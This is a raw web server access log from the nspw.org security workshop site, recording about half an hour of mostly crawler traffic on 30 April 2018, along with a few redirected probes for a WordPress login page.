www.nspw.org:80 46.229.168.78 - - [30/Apr/2018:22:02:30 -0400] "GET /2005/cfp/latex/talk4.ps HTTP/1.1" 302 538 "-" "Mozilla/5.0 (compatible; SemrushBot/1.2~bl; +http://www.semrush.com/bot.html)"
www.nspw.org:80 69.162.124.227 - - [30/Apr/2018:22:02:45 -0400] "HEAD / HTTP/1.1" 302 188 "http://nspw.org/" "Mozilla/5.0+(compatible; UptimeRobot/2.0; http://www.uptimerobot.com/)"
www.nspw.org:80 66.249.73.74 - - [30/Apr/2018:22:03:18 -0400] "GET /2009/proceedings/2008/nspw2008-beautement.pdf HTTP/1.1" 302 619 "-" "Googlebot/2.1 (+http://www.google.com/bot.html)"
www.nspw.org:80 46.229.168.69 - - [30/Apr/2018:22:03:21 -0400] "GET /2013/ HTTP/1.1" 302 502 "-" "Mozilla/5.0 (compatible; SemrushBot/1.2~bl; +http://www.semrush.com/bot.html)"
www.nspw.org:80 46.229.168.69 - - [30/Apr/2018:22:03:21 -0400] "GET /2013/ HTTP/1.1" 302 502 "-" "Mozilla/5.0 (compatible; SemrushBot/1.2~bl; +http://www.semrush.com/bot.html)"
www.nspw.org:80 93.158.161.91 - - [30/Apr/2018:22:03:24 -0400] "GET /2006/tmp/?C=S;O=A HTTP/1.1" 302 563 "-" "Mozilla/5.0 (compatible; YandexBot/3.0; +http://yandex.com/bots)"
www.nspw.org:80 43.239.223.189 - - [30/Apr/2018:22:03:32 -0400] "GET / HTTP/1.1" 302 525 "http://nspw.org" "Mozilla/5.0 (Macintosh; Intel Mac OS X 10_13_1) AppleWebKit/604.3.5 (KHTML, like Gecko) Version/11.0.1 Safari/604.3.5"
www.nspw.org:80 46.229.168.74 - - [30/Apr/2018:22:03:35 -0400] "GET /2003/past.shtml.bak HTTP/1.1" 302 530 "-" "Mozilla/5.0 (compatible; SemrushBot/1.2~bl; +http://www.semrush.com/bot.html)"
www.nspw.org:80 46.229.168.65 - - [30/Apr/2018:22:03:55 -0400] "GET /2009/proceedings/1994/?C=N%3BO%3DD HTTP/1.1" 302 560 "-" "Mozilla/5.0 (compatible; SemrushBot/1.2~bl; +http://www.semrush.com/bot.html)"
www.nspw.org:80 84.201.133.10 - - [30/Apr/2018:22:04:01 -0400] "GET /papers/2001/?C=N;O=D HTTP/1.1" 302 569 "-" "Mozilla/5.0 (compatible; YandexBot/3.0; +http://yandex.com/bots)"
www.nspw.org:80 54.36.148.163 - - [30/Apr/2018:22:04:12 -0400] "GET /2011/sponsors HTTP/1.1" 302 499 "-" "Mozilla/5.0 (compatible; AhrefsBot/5.2; +http://ahrefs.com/robot/)"
www.nspw.org:80 46.229.168.65 - - [30/Apr/2018:22:04:35 -0400] "GET /proceedings/1998 HTTP/1.1" 302 524 "-" "Mozilla/5.0 (compatible; SemrushBot/1.2~bl; +http://www.semrush.com/bot.html)"
www.nspw.org:80 46.229.168.74 - - [30/Apr/2018:22:04:50 -0400] "GET /2009/proceedings/2012/forms/authors.htm HTTP/1.1" 302 570 "-" "Mozilla/5.0 (compatible; SemrushBot/1.2~bl; +http://www.semrush.com/bot.html)"
www.nspw.org:80 46.229.168.75 - - [30/Apr/2018:22:05:19 -0400] "GET /2009/proceedings/1998/?C=S%3BO%3DA HTTP/1.1" 302 560 "-" "Mozilla/5.0 (compatible; SemrushBot/1.2~bl; +http://www.semrush.com/bot.html)"
www.nspw.org:80 46.229.168.79 - - [30/Apr/2018:22:05:33 -0400] "GET /2009/program.content HTTP/1.1" 302 532 "-" "Mozilla/5.0 (compatible; SemrushBot/1.2~bl; +http://www.semrush.com/bot.html)"
www.nspw.org:80 46.229.168.79 - - [30/Apr/2018:22:05:33 -0400] "GET /2009/program.content HTTP/1.1" 302 532 "-" "Mozilla/5.0 (compatible; SemrushBot/1.2~bl; +http://www.semrush.com/bot.html)"
www.nspw.org:80 46.229.168.67 - - [30/Apr/2018:22:05:49 -0400] "GET /2008/papers.shtml HTTP/1.1" 302 526 "-" "Mozilla/5.0 (compatible; SemrushBot/1.2~bl; +http://www.semrush.com/bot.html)"
www.nspw.org:80 66.249.73.76 - - [30/Apr/2018:22:05:54 -0400] "GET /2009/proceedings/1994/nspw1994-lin.pdf HTTP/1.1" 302 605 "-" "Googlebot/2.1 (+http://www.google.com/bot.html)"
www.nspw.org:80 54.165.6.226 - - [30/Apr/2018:22:05:57 -0400] "GET /papers/2006/nspw2006-conti.pdf HTTP/1.1" 302 589 "-" "python-requests/2.18.4"
www.nspw.org:80 46.229.168.76 - - [30/Apr/2018:22:06:12 -0400] "GET /2009/ HTTP/1.1" 302 502 "-" "Mozilla/5.0 (compatible; SemrushBot/1.2~bl; +http://www.semrush.com/bot.html)"
www.nspw.org:80 82.207.61.238 - - [30/Apr/2018:22:06:30 -0400] "GET /?q=user/register HTTP/1.1" 302 501 "http://nspw.org" "Mozilla/5.0 (Macintosh; Intel Mac OS X 10_13_1) AppleWebKit/604.3.5 (KHTML, like Gecko) Version/11.0.1 Safari/604.3.5"
www.nspw.org:80 82.207.61.238 - - [30/Apr/2018:22:06:32 -0400] "GET /?q=user/register HTTP/1.1" 302 505 "-" "Mozilla/5.0 (Macintosh; Intel Mac OS X 10_13_1) AppleWebKit/604.3.5 (KHTML, like Gecko) Version/11.0.1 Safari/604.3.5"
www.nspw.org:80 82.207.61.238 - - [30/Apr/2018:22:06:34 -0400] "GET /?q=user/register HTTP/1.1" 302 505 "https://www.nspw.org/" "Mozilla/5.0 (Macintosh; Intel Mac OS X 10_13_1) AppleWebKit/604.3.5 (KHTML, like Gecko) Version/11.0.1 Safari/604.3.5"
www.nspw.org:80 82.207.61.238 - - [30/Apr/2018:22:06:35 -0400] "GET /?q=user/register HTTP/1.1" 302 505 "https://www.nspw.org/" "Mozilla/5.0 (Macintosh; Intel Mac OS X 10_13_1) AppleWebKit/604.3.5 (KHTML, like Gecko) Version/11.0.1 Safari/604.3.5"
www.nspw.org:80 46.229.168.71 - - [30/Apr/2018:22:06:39 -0400] "GET /2009/submission.content HTTP/1.1" 302 538 "-" "Mozilla/5.0 (compatible; SemrushBot/1.2~bl; +http://www.semrush.com/bot.html)"
www.nspw.org:80 66.249.73.72 - - [30/Apr/2018:22:06:51 -0400] "GET /2009/proceedings/2005/nspw2005-locasto.pdf HTTP/1.1" 302 613 "-" "Googlebot/2.1 (+http://www.google.com/bot.html)"
www.nspw.org:80 46.229.168.72 - - [30/Apr/2018:22:07:04 -0400] "GET /2005/submission.shtml HTTP/1.1" 302 534 "-" "Mozilla/5.0 (compatible; SemrushBot/1.2~bl; +http://www.semrush.com/bot.html)"
www.nspw.org:80 40.77.167.108 - - [30/Apr/2018:22:07:17 -0400] "GET /papers/2004/nspw2004-hollebeek.pdf HTTP/1.1" 302 597 "-" "Mozilla/5.0 (iPhone; CPU iPhone OS 7_0 like Mac OS X) AppleWebKit/537.51.1 (KHTML, like Gecko) Version/7.0 Mobile/11A465 Safari/9537.53 (compatible; bingbot/2.0; +http://www.bing.com/bingbot.htm)"
www.nspw.org:80 66.249.73.72 - - [30/Apr/2018:22:07:28 -0400] "GET /2009/proceedings/2013/nspw2013-crane.pdf HTTP/1.1" 302 609 "-" "Googlebot/2.1 (+http://www.google.com/bot.html)"
www.nspw.org:80 36.110.211.41 - - [30/Apr/2018:22:07:34 -0400] "GET / HTTP/1.1" 302 473 "http://www.so.com" "Mozilla/5.0 (Windows NT 6.2; rv:30.0) Gecko/20150101 Firefox/32.0 360Spider 360Spider"
www.nspw.org:80 46.229.168.80 - - [30/Apr/2018:22:07:40 -0400] "GET /2006/pc.shtml HTTP/1.1" 302 518 "-" "Mozilla/5.0 (compatible; SemrushBot/1.2~bl; +http://www.semrush.com/bot.html)"
www.nspw.org:80 69.162.124.227 - - [30/Apr/2018:22:07:45 -0400] "HEAD / HTTP/1.1" 302 188 "http://nspw.org/" "Mozilla/5.0+(compatible; UptimeRobot/2.0; http://www.uptimerobot.com/)"
www.nspw.org:80 46.229.168.67 - - [30/Apr/2018:22:07:55 -0400] "GET /proceedings/1997 HTTP/1.1" 302 524 "-" "Mozilla/5.0 (compatible; SemrushBot/1.2~bl; +http://www.semrush.com/bot.html)"
www.nspw.org:80 46.229.168.70 - - [30/Apr/2018:22:08:25 -0400] "GET /2017/ HTTP/1.1" 302 502 "-" "Mozilla/5.0 (compatible; SemrushBot/1.2~bl; +http://www.semrush.com/bot.html)"
www.nspw.org:80 46.229.168.74 - - [30/Apr/2018:22:09:03 -0400] "GET /2008/proceedings.shtml HTTP/1.1" 302 536 "-" "Mozilla/5.0 (compatible; SemrushBot/1.2~bl; +http://www.semrush.com/bot.html)"
www.nspw.org:80 46.229.168.74 - - [30/Apr/2018:22:09:03 -0400] "GET /2008/proceedings.shtml HTTP/1.1" 302 536 "-" "Mozilla/5.0 (compatible; SemrushBot/1.2~bl; +http://www.semrush.com/bot.html)"
www.nspw.org:80 46.229.168.67 - - [30/Apr/2018:22:09:10 -0400] "GET /2003/submission.shtml HTTP/1.1" 302 534 "-" "Mozilla/5.0 (compatible; SemrushBot/1.2~bl; +http://www.semrush.com/bot.html)"
www.nspw.org:80 46.229.168.67 - - [30/Apr/2018:22:09:33 -0400] "GET /papers/2012/ HTTP/1.1" 302 516 "-" "Mozilla/5.0 (compatible; SemrushBot/1.2~bl; +http://www.semrush.com/bot.html)"
www.nspw.org:80 66.249.73.76 - - [30/Apr/2018:22:09:45 -0400] "GET /papers/2003/nspw2003-beres.pdf HTTP/1.1" 302 589 "-" "Googlebot/2.1 (+http://www.google.com/bot.html)"
www.nspw.org:80 46.229.168.75 - - [30/Apr/2018:22:09:57 -0400] "GET /2013/cfp HTTP/1.1" 302 508 "-" "Mozilla/5.0 (compatible; SemrushBot/1.2~bl; +http://www.semrush.com/bot.html)"
www.nspw.org:80 196.52.43.127 - - [30/Apr/2018:22:10:17 -0400] "GET / HTTP/1.0" 302 492 "-" "Mozilla/5.0(WindowsNT6.1;rv:31.0)Gecko/20100101Firefox/31.0"
www.nspw.org:80 46.229.168.75 - - [30/Apr/2018:22:10:18 -0400] "GET /2009/tmp/?C=M%3BO%3DA HTTP/1.1" 302 534 "-" "Mozilla/5.0 (compatible; SemrushBot/1.2~bl; +http://www.semrush.com/bot.html)"
www.nspw.org:80 46.229.168.73 - - [30/Apr/2018:22:10:39 -0400] "GET /2009/proceedings.shtml HTTP/1.1" 302 536 "-" "Mozilla/5.0 (compatible; SemrushBot/1.2~bl; +http://www.semrush.com/bot.html)"
www.nspw.org:80 66.249.73.74 - - [30/Apr/2018:22:10:48 -0400] "GET /papers/2013/nspw2013-peisert.pdf HTTP/1.1" 302 593 "-" "Mozilla/5.0 (compatible; Googlebot/2.1; +http://www.google.com/bot.html)"
www.nspw.org:80 46.229.168.70 - - [30/Apr/2018:22:11:07 -0400] "GET /2009/proceedings/1994/?C=M%3BO%3DA HTTP/1.1" 302 560 "-" "Mozilla/5.0 (compatible; SemrushBot/1.2~bl; +http://www.semrush.com/bot.html)"
www.nspw.org:80 35.168.7.230 - - [30/Apr/2018:22:11:18 -0400] "GET / HTTP/1.1" 302 531 "-" "Mozilla/5.0 (Windows NT 6.2;en-US) AppleWebKit/537.32.36 (KHTML, live Gecko) Chrome/53.0.3102.58 Safari/537.32"
www.nspw.org:80 46.229.168.73 - - [30/Apr/2018:22:11:25 -0400] "GET /2005/cfp/latex/floatsty.sty HTTP/1.1" 302 546 "-" "Mozilla/5.0 (compatible; SemrushBot/1.2~bl; +http://www.semrush.com/bot.html)"
www.nspw.org:80 46.229.168.68 - - [30/Apr/2018:22:11:50 -0400] "GET /2017/cfp HTTP/1.1" 302 508 "-" "Mozilla/5.0 (compatible; SemrushBot/1.2~bl; +http://www.semrush.com/bot.html)"
www.nspw.org:80 46.229.168.69 - - [30/Apr/2018:22:12:13 -0400] "GET /papers/2012/forms/authors.htm HTTP/1.1" 302 550 "-" "Mozilla/5.0 (compatible; SemrushBot/1.2~bl; +http://www.semrush.com/bot.html)"
www.nspw.org:80 46.229.168.73 - - [30/Apr/2018:22:12:33 -0400] "GET /2005/cfp/latex/?C=N%3BO%3DD HTTP/1.1" 302 546 "-" "Mozilla/5.0 (compatible; SemrushBot/1.2~bl; +http://www.semrush.com/bot.html)"
www.nspw.org:80 107.210.212.141 - - [30/Apr/2018:22:12:35 -0400] "GET /wp-login.php HTTP/1.1" 302 553 "-" "Mozilla/5.0 (Windows NT 6.1; WOW64; rv:40.0) Gecko/20100101 Firefox/40.1"
www.nspw.org:80 107.210.212.141 - - [30/Apr/2018:22:12:36 -0400] "GET / HTTP/1.1" 302 528 "-" "Mozilla/5.0 (Windows NT 6.1; WOW64; rv:40.0) Gecko/20100101 Firefox/40.1"
www.nspw.org:80 69.162.124.227 - - [30/Apr/2018:22:12:44 -0400] "HEAD / HTTP/1.1" 302 188 "http://nspw.org/" "Mozilla/5.0+(compatible; UptimeRobot/2.0; http://www.uptimerobot.com/)"
www.nspw.org:80 46.229.168.73 - - [30/Apr/2018:22:12:57 -0400] "GET /2007/cfp.shtml HTTP/1.1" 302 520 "-" "Mozilla/5.0 (compatible; SemrushBot/1.2~bl; +http://www.semrush.com/bot.html)"
www.nspw.org:80 54.36.148.179 - - [30/Apr/2018:22:13:25 -0400] "GET /2011/2011/papers HTTP/1.1" 302 505 "-" "Mozilla/5.0 (compatible; AhrefsBot/5.2; +http://ahrefs.com/robot/)"
www.nspw.org:80 46.229.168.75 - - [30/Apr/2018:22:13:28 -0400] "GET /2009/proceedings/1996/ HTTP/1.1" 302 536 "-" "Mozilla/5.0 (compatible; SemrushBot/1.2~bl; +http://www.semrush.com/bot.html)"
www.nspw.org:80 35.226.23.240 - - [30/Apr/2018:22:13:37 -0400] "GET /robots.txt HTTP/1.1" 302 512 "-" "ltx71 - (http://ltx71.com/)"
www.nspw.org:80 46.229.168.74 - - [30/Apr/2018:22:14:02 -0400] "GET /papers/2009/?C=M%3BO%3DA HTTP/1.1" 302 540 "-" "Mozilla/5.0 (compatible; SemrushBot/1.2~bl; +http://www.semrush.com/bot.html)"
www.nspw.org:80 46.229.168.73 - - [30/Apr/2018:22:14:06 -0400] "GET /papers/2006/?C=S%3BO%3DA HTTP/1.1" 302 540 "-" "Mozilla/5.0 (compatible; SemrushBot/1.2~bl; +http://www.semrush.com/bot.html)"
www.nspw.org:80 40.77.167.66 - - [30/Apr/2018:22:14:32 -0400] "GET /papers/2007/nspw2007-kursawe.pdf HTTP/1.1" 302 593 "-" "Mozilla/5.0 (iPhone; CPU iPhone OS 7_0 like Mac OS X) AppleWebKit/537.51.1 (KHTML, like Gecko) Version/7.0 Mobile/11A465 Safari/9537.53 (compatible; bingbot/2.0; +http://www.bing.com/bingbot.htm)"
www.nspw.org:80 46.229.168.71 - - [30/Apr/2018:22:14:37 -0400] "GET /2012/dates HTTP/1.1" 302 512 "-" "Mozilla/5.0 (compatible; SemrushBot/1.2~bl; +http://www.semrush.com/bot.html)"
www.nspw.org:80 46.229.168.73 - - [30/Apr/2018:22:14:57 -0400] "GET /proceedings/2007 HTTP/1.1" 302 524 "-" "Mozilla/5.0 (compatible; SemrushBot/1.2~bl; +http://www.semrush.com/bot.html)"
www.nspw.org:80 46.229.168.71 - - [30/Apr/2018:22:15:16 -0400] "GET /2000/local.html HTTP/1.1" 302 522 "-" "Mozilla/5.0 (compatible; SemrushBot/1.2~bl; +http://www.semrush.com/bot.html)"
www.nspw.org:80 216.244.66.200 - - [30/Apr/2018:22:15:34 -0400] "GET /2003/nspw-footer.html HTTP/1.1" 302 515 "-" "Mozilla/5.0 (compatible; DotBot/1.1; http://www.opensiteexplorer.org/dotbot, help@moz.com)"
www.nspw.org:80 46.229.168.75 - - [30/Apr/2018:22:15:44 -0400] "GET /2011/sponsors HTTP/1.1" 302 518 "-" "Mozilla/5.0 (compatible; SemrushBot/1.2~bl; +http://www.semrush.com/bot.html)"
www.nspw.org:80 119.94.82.134 - - [30/Apr/2018:22:16:09 -0400] "GET /wp-login.php HTTP/1.1" 302 553 "-" "Mozilla/5.0 (Windows NT 6.1; WOW64; rv:40.0) Gecko/20100101 Firefox/40.1"
www.nspw.org:80 119.94.82.134 - - [30/Apr/2018:22:16:10 -0400] "GET / HTTP/1.1" 302 528 "-" "Mozilla/5.0 (Windows NT 6.1; WOW64; rv:40.0) Gecko/20100101 Firefox/40.1"
www.nspw.org:80 46.229.168.72 - - [30/Apr/2018:22:16:23 -0400] "GET /2002/panel.html HTTP/1.1" 302 522 "-" "Mozilla/5.0 (compatible; SemrushBot/1.2~bl; +http://www.semrush.com/bot.html)"
www.nspw.org:80 46.229.168.72 - - [30/Apr/2018:22:16:23 -0400] "GET /2002/panel.html HTTP/1.1" 302 522 "-" "Mozilla/5.0 (compatible; SemrushBot/1.2~bl; +http://www.semrush.com/bot.html)"
www.nspw.org:80 46.229.168.72 - - [30/Apr/2018:22:16:41 -0400] "GET /2016/accepted HTTP/1.1" 302 518 "-" "Mozilla/5.0 (compatible; SemrushBot/1.2~bl; +http://www.semrush.com/bot.html)"
www.nspw.org:80 46.229.168.80 - - [30/Apr/2018:22:16:46 -0400] "GET /2006/?C=D%3BO%3DA HTTP/1.1" 302 526 "-" "Mozilla/5.0 (compatible; SemrushBot/1.2~bl; +http://www.semrush.com/bot.html)"
www.nspw.org:80 46.229.168.70 - - [30/Apr/2018:22:17:12 -0400] "GET /2013/papers HTTP/1.1" 302 514 "-" "Mozilla/5.0 (compatible; SemrushBot/1.2~bl; +http://www.semrush.com/bot.html)"
www.nspw.org:80 69.162.124.227 - - [30/Apr/2018:22:17:44 -0400] "HEAD / HTTP/1.1" 302 188 "http://nspw.org/" "Mozilla/5.0+(compatible; UptimeRobot/2.0; http://www.uptimerobot.com/)"
www.nspw.org:80 46.229.168.74 - - [30/Apr/2018:22:17:48 -0400] "GET /2000/program_print.html HTTP/1.1" 302 538 "-" "Mozilla/5.0 (compatible; SemrushBot/1.2~bl; +http://www.semrush.com/bot.html)"
www.nspw.org:80 40.77.167.206 - - [30/Apr/2018:22:17:56 -0400] "GET /papers/2007/nspw2007-solworth.pdf HTTP/1.1" 302 595 "-" "Mozilla/5.0 (iPhone; CPU iPhone OS 7_0 like Mac OS X) AppleWebKit/537.51.1 (KHTML, like Gecko) Version/7.0 Mobile/11A465 Safari/9537.53 (compatible; bingbot/2.0; +http://www.bing.com/bingbot.htm)"
www.nspw.org:80 46.229.168.66 - - [30/Apr/2018:22:18:14 -0400] "GET /papers/2009/?C=D%3BO%3DA HTTP/1.1" 302 540 "-" "Mozilla/5.0 (compatible; SemrushBot/1.2~bl; +http://www.semrush.com/bot.html)"
www.nspw.org:80 46.229.168.66 - - [30/Apr/2018:22:18:14 -0400] "GET /papers/2009/?C=D%3BO%3DA HTTP/1.1" 302 540 "-" "Mozilla/5.0 (compatible; SemrushBot/1.2~bl; +http://www.semrush.com/bot.html)"
www.nspw.org:80 46.229.168.80 - - [30/Apr/2018:22:18:21 -0400] "GET /2009/proceedings/1996/?C=M%3BO%3DA HTTP/1.1" 302 560 "-" "Mozilla/5.0 (compatible; SemrushBot/1.2~bl; +http://www.semrush.com/bot.html)"
www.nspw.org:80 46.229.168.75 - - [30/Apr/2018:22:18:48 -0400] "GET /papers/2012/forms/authors.htm HTTP/1.1" 302 550 "-" "Mozilla/5.0 (compatible; SemrushBot/1.2~bl; +http://www.semrush.com/bot.html)"
www.nspw.org:80 46.229.168.74 - - [30/Apr/2018:22:19:19 -0400] "GET /node/70 HTTP/1.1" 302 506 "-" "Mozilla/5.0 (compatible; SemrushBot/1.2~bl; +http://www.semrush.com/bot.html)"
www.nspw.org:80 46.229.168.76 - - [30/Apr/2018:22:19:22 -0400] "GET /proceedings/2011 HTTP/1.1" 302 524 "-" "Mozilla/5.0 (compatible; SemrushBot/1.2~bl; +http://www.semrush.com/bot.html)"
www.nspw.org:80 46.229.168.73 - - [30/Apr/2018:22:19:45 -0400] "GET /2006/cfp/?C=D%3BO%3DA HTTP/1.1" 302 534 "-" "Mozilla/5.0 (compatible; SemrushBot/1.2~bl; +http://www.semrush.com/bot.html)"
www.nspw.org:80 46.229.168.69 - - [30/Apr/2018:22:20:03 -0400] "GET /2012/ HTTP/1.1" 302 502 "-" "Mozilla/5.0 (compatible; SemrushBot/1.2~bl; +http://www.semrush.com/bot.html)"
www.nspw.org:80 46.229.168.72 - - [30/Apr/2018:22:20:52 -0400] "GET /2008/submission.content.tba HTTP/1.1" 302 546 "-" "Mozilla/5.0 (compatible; SemrushBot/1.2~bl; +http://www.semrush.com/bot.html)"
www.nspw.org:80 46.229.168.72 - - [30/Apr/2018:22:20:52 -0400] "GET /2008/submission.content.tba HTTP/1.1" 302 546 "-" "Mozilla/5.0 (compatible; SemrushBot/1.2~bl; +http://www.semrush.com/bot.html)"
www.nspw.org:80 46.229.168.67 - - [30/Apr/2018:22:20:52 -0400] "GET /papers/?C=M%3BO%3DA HTTP/1.1" 302 530 "-" "Mozilla/5.0 (compatible; SemrushBot/1.2~bl; +http://www.semrush.com/bot.html)"
www.nspw.org:80 180.76.15.153 - - [30/Apr/2018:22:21:07 -0400] "GET /papers/2011/nspw2011-hamacher.pdf HTTP/1.1" 302 558 "-" "Mozilla/5.0 (compatible; Baiduspider/2.0; +http://www.baidu.com/search/spider.html)"
www.nspw.org:80 46.229.168.70 - - [30/Apr/2018:22:21:17 -0400] "GET /2002/papers.content HTTP/1.1" 302 530 "-" "Mozilla/5.0 (compatible; SemrushBot/1.2~bl; +http://www.semrush.com/bot.html)"
www.nspw.org:80 46.229.168.65 - - [30/Apr/2018:22:21:44 -0400] "GET /2002/?C=N%3BO%3DD HTTP/1.1" 302 526 "-" "Mozilla/5.0 (compatible; SemrushBot/1.2~bl; +http://www.semrush.com/bot.html)"
www.nspw.org:80 46.229.168.72 - - [30/Apr/2018:22:22:23 -0400] "GET /2008/invite-old/local.html HTTP/1.1" 302 544 "-" "Mozilla/5.0 (compatible; SemrushBot/1.2~bl; +http://www.semrush.com/bot.html)"
www.nspw.org:80 69.162.124.227 - - [30/Apr/2018:22:22:45 -0400] "HEAD / HTTP/1.1" 302 188 "http://nspw.org/" "Mozilla/5.0+(compatible; UptimeRobot/2.0; http://www.uptimerobot.com/)"
www.nspw.org:80 46.229.168.71 - - [30/Apr/2018:22:22:47 -0400] "GET /2008/cfp.shtml HTTP/1.1" 302 520 "-" "Mozilla/5.0 (compatible; SemrushBot/1.2~bl; +http://www.semrush.com/bot.html)"
www.nspw.org:80 46.229.168.67 - - [30/Apr/2018:22:22:49 -0400] "GET /2002/program.shtml HTTP/1.1" 302 528 "-" "Mozilla/5.0 (compatible; SemrushBot/1.2~bl; +http://www.semrush.com/bot.html)"
www.nspw.org:80 180.76.15.150 - - [30/Apr/2018:22:23:07 -0400] "GET /2006/submission.shtml HTTP/1.1" 302 534 "-" "Mozilla/5.0 (compatible; Baiduspider/2.0; +http://www.baidu.com/search/spider.html)"
www.nspw.org:80 46.229.168.72 - - [30/Apr/2018:22:23:18 -0400] "GET /past HTTP/1.1" 302 500 "-" "Mozilla/5.0 (compatible; SemrushBot/1.2~bl; +http://www.semrush.com/bot.html)"
www.nspw.org:80 46.229.168.70 - - [30/Apr/2018:22:23:39 -0400] "GET /2002/papers.shtml HTTP/1.1" 302 526 "-" "Mozilla/5.0 (compatible; SemrushBot/1.2~bl; +http://www.semrush.com/bot.html)"
www.nspw.org:80 183.83.192.144 - - [30/Apr/2018:22:23:47 -0400] "GET /wp-login.php HTTP/1.1" 302 553 "-" "Mozilla/5.0 (Windows NT 6.1; WOW64; rv:40.0) Gecko/20100101 Firefox/40.1"
www.nspw.org:80 183.83.192.144 - - [30/Apr/2018:22:23:48 -0400] "GET / HTTP/1.1" 302 528 "-" "Mozilla/5.0 (Windows NT 6.1; WOW64; rv:40.0) Gecko/20100101 Firefox/40.1"
www.nspw.org:80 46.229.168.69 - - [30/Apr/2018:22:23:57 -0400] "GET /2008/cfp.content.2007 HTTP/1.1" 302 534 "-" "Mozilla/5.0 (compatible; SemrushBot/1.2~bl; +http://www.semrush.com/bot.html)"
www.nspw.org:80 180.76.15.15 - - [30/Apr/2018:22:24:07 -0400] "GET /papers/?C=S;O=A HTTP/1.1" 302 522 "-" "Mozilla/5.0 (compatible; Baiduspider/2.0; +http://www.baidu.com/search/spider.html)"
www.nspw.org:80 216.244.66.200 - - [30/Apr/2018:22:24:20 -0400] "GET /2009/proceedings/2004/?C=S;O=A HTTP/1.1" 302 533 "-" "Mozilla/5.0 (compatible; DotBot/1.1; http://www.opensiteexplorer.org/dotbot, help@moz.com)"
www.nspw.org:80 46.229.168.79 - - [30/Apr/2018:22:24:25 -0400] "GET /2009/proceedings/2012/forms/authors.htm HTTP/1.1" 302 570 "-" "Mozilla/5.0 (compatible; SemrushBot/1.2~bl; +http://www.semrush.com/bot.html)"
www.nspw.org:80 46.229.168.79 - - [30/Apr/2018:22:24:54 -0400] "GET /2002/index.hold HTTP/1.1" 302 522 "-" "Mozilla/5.0 (compatible; SemrushBot/1.2~bl; +http://www.semrush.com/bot.html)"
www.nspw.org:80 46.229.168.70 - - [30/Apr/2018:22:25:01 -0400] "GET /2002/index.content HTTP/1.1" 302 528 "-" "Mozilla/5.0 (compatible; SemrushBot/1.2~bl; +http://www.semrush.com/bot.html)"
www.nspw.org:80 180.76.15.134 - - [30/Apr/2018:22:25:07 -0400] "GET /2013 HTTP/1.1" 302 500 "-" "Mozilla/5.0 (compatible; Baiduspider/2.0; +http://www.baidu.com/search/spider.html)"
www.nspw.org:80 46.229.168.71 - - [30/Apr/2018:22:25:28 -0400] "GET /2009/proceedings/2012/forms/authors.htm HTTP/1.1" 302 570 "-" "Mozilla/5.0 (compatible; SemrushBot/1.2~bl; +http://www.semrush.com/bot.html)"
www.nspw.org:80 31.166.117.35 - - [30/Apr/2018:22:26:00 -0400] "GET /wp-login.php HTTP/1.1" 302 553 "-" "Mozilla/5.0 (Windows NT 6.1; WOW64; rv:40.0) Gecko/20100101 Firefox/40.1"
www.nspw.org:80 46.229.168.68 - - [30/Apr/2018:22:26:00 -0400] "GET /2009/cfp/cfp.text HTTP/1.1" 302 526 "-" "Mozilla/5.0 (compatible; SemrushBot/1.2~bl; +http://www.semrush.com/bot.html)"
www.nspw.org:80 31.166.117.35 - - [30/Apr/2018:22:26:01 -0400] "GET / HTTP/1.1" 302 528 "-" "Mozilla/5.0 (Windows NT 6.1; WOW64; rv:40.0) Gecko/20100101 Firefox/40.1"
www.nspw.org:80 180.76.15.25 - - [30/Apr/2018:22:26:07 -0400] "GET /papers/2008/nspw2008-beautement.pdf HTTP/1.1" 302 562 "-" "Mozilla/5.0 (compatible; Baiduspider/2.0; +http://www.baidu.com/search/spider.html)"
www.nspw.org:80 46.229.168.66 - - [30/Apr/2018:22:26:19 -0400] "GET /2004/past.content HTTP/1.1" 302 526 "-" "Mozilla/5.0 (compatible; SemrushBot/1.2~bl; +http://www.semrush.com/bot.html)"
www.nspw.org:80 54.36.148.76 - - [30/Apr/2018:22:26:23 -0400] "GET /proceedings/2006 HTTP/1.1" 302 505 "-" "Mozilla/5.0 (compatible; AhrefsBot/5.2; +http://ahrefs.com/robot/)"
www.nspw.org:80 46.229.168.66 - - [30/Apr/2018:22:26:51 -0400] "GET /past HTTP/1.1" 302 500 "-" "Mozilla/5.0 (compatible; SemrushBot/1.2~bl; +http://www.semrush.com/bot.html)"
www.nspw.org:80 46.229.168.75 - - [30/Apr/2018:22:26:58 -0400] "GET /2009/proceedings/2002/?C=M%3BO%3DA HTTP/1.1" 302 560 "-" "Mozilla/5.0 (compatible; SemrushBot/1.2~bl; +http://www.semrush.com/bot.html)"
www.nspw.org:80 180.76.15.146 - - [30/Apr/2018:22:27:07 -0400] "GET /papers/1994/nspw1994-schneier.pdf HTTP/1.1" 302 558 "-" "Mozilla/5.0 (compatible; Baiduspider/2.0; +http://www.baidu.com/search/spider.html)"
www.nspw.org:80 46.229.168.65 - - [30/Apr/2018:22:27:31 -0400] "GET /2004/?C=M%3BO%3DA HTTP/1.1" 302 526 "-" "Mozilla/5.0 (compatible; SemrushBot/1.2~bl; +http://www.semrush.com/bot.html)"
www.nspw.org:80 69.162.124.227 - - [30/Apr/2018:22:27:45 -0400] "HEAD / HTTP/1.1" 302 188 "http://nspw.org/" "Mozilla/5.0+(compatible; UptimeRobot/2.0; http://www.uptimerobot.com/)"
www.nspw.org:80 46.229.168.73 - - [30/Apr/2018:22:27:50 -0400] "GET /2012/submissions HTTP/1.1" 302 524 "-" "Mozilla/5.0 (compatible; SemrushBot/1.2~bl; +http://www.semrush.com/bot.html)"
www.nspw.org:80 46.229.168.68 - - [30/Apr/2018:22:28:06 -0400] "GET /2004/local.content HTTP/1.1" 302 528 "-" "Mozilla/5.0 (compatible; SemrushBot/1.2~bl; +http://www.semrush.com/bot.html)"
www.nspw.org:80 180.76.15.148 - - [30/Apr/2018:22:28:07 -0400] "GET /2011/ HTTP/1.1" 302 502 "-" "Mozilla/5.0 (compatible; Baiduspider/2.0; +http://www.baidu.com/search/spider.html)"
www.nspw.org:80 58.27.115.84 - - [30/Apr/2018:22:28:13 -0400] "GET /wp-login.php HTTP/1.1" 302 553 "-" "Mozilla/5.0 (Windows NT 6.1; WOW64; rv:40.0) Gecko/20100101 Firefox/40.1"
www.nspw.org:80 58.27.115.84 - - [30/Apr/2018:22:28:15 -0400] "GET / HTTP/1.1" 302 528 "-" "Mozilla/5.0 (Windows NT 6.1; WOW64; rv:40.0) Gecko/20100101 Firefox/40.1"
